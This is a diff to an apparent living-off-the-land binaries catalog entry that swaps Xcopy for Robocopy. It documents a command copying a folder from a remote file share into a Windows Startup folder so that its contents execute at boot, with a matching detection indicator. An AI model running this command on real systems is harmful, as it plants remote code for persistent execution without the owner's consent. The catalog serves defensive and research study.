@@ -1,11 +1,11 @@
 ---
-Name: Xcopy.exe
-Description: Xcopy
+Name: Robocopy.exe
+Description: Robocopy
 Author: 'Freddie Barr-Smith'
 Created: '2019-12-24'
 Commands:
-  - Command: xcopy.exe file.bat  "C:\Users\IEUser\Start Menu\Programs\Startup"
-    Description: Use xcopy to add a file to the startup boot sequence to execute
+  - Command: robocopy.exe  \\10.0.2.11\ropnop\roprobo "C:\Users\IEUser\Start Menu\Programs\Startup"
+    Description: Use robocopy to add the contents a folder to the startup boot sequence to execute from a fileshare
     Usecase: Proxy execution of binary
     Category: Execute
     Privileges: User
@@ -14,12 +14,13 @@ Commands:
     OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 
 Full_Path:
-  - Path: C:\WINDOWS\System32\Xcopy.exe
-  - Path: C:\WINDOWS\SysWOW64\Xcopy.exe
+  - Path: C:\WINDOWS\System32\Robocopy.exe
+  - Path: C:\WINDOWS\SysWOW64\Robocopy.exe
+
 Code_Sample: 
   - Code:
 Detection:
-  - IOC: Xcopy to a directory that runs all files within at system startup
+  - IOC: Robocopy to a directory that runs all files within at system startup
 Resources:
   - Link: https://freddiebarrsmith.com/trix/trix.html
   - Link: https://azeria-labs.com/persistence/
